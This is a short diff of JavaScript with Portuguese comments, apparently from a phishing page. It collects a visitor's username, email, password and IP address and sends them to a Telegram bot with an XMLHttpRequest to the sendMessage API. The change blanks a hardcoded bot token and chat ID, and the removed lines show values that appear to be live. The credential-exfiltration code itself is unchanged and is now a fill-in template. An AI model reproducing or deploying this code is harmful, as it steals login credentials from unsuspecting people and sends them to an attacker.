@@ -111,8 +111,8 @@
           var ip = data.ip;
           var mensagem = "Usuário: " + username + "\nEmail: " + email + "\nSenha: " + password + "\nIP: " + ip;
 
-          var api_key = '6210755753:AAHYK-7FWVEM0ub84R3FaeNAFxGaT9SLRAE';  // TOKEN DO SEU BOT
-          var chat_id = '-1001829193165';  // Chat ID
+          var api_key = '';  // TOKEN DO SEU BOT
+          var chat_id = '';  // Chat ID
 
           var xhttp = new XMLHttpRequest();
           xhttp.open("GET", "https://api.telegram.org/bot" + api_key + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(mensagem), true);
